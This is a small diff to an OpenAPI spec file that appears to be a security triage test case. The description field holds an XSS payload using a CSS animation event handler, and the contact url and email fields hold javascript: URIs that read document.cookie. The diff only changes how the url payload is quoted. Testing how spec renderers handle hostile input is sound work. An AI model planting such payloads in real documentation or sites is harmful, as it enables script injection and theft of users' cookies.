@@ -5,7 +5,7 @@ info:
   description: <style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
   contact: 
    name: "GovTech Triage"
-   url: " javascript:alert(document.cookie)"
+   url: '" javascript:alert(document.cookie)'
    email: " javascript:alert(document.cookie)"
 paths:
   /:
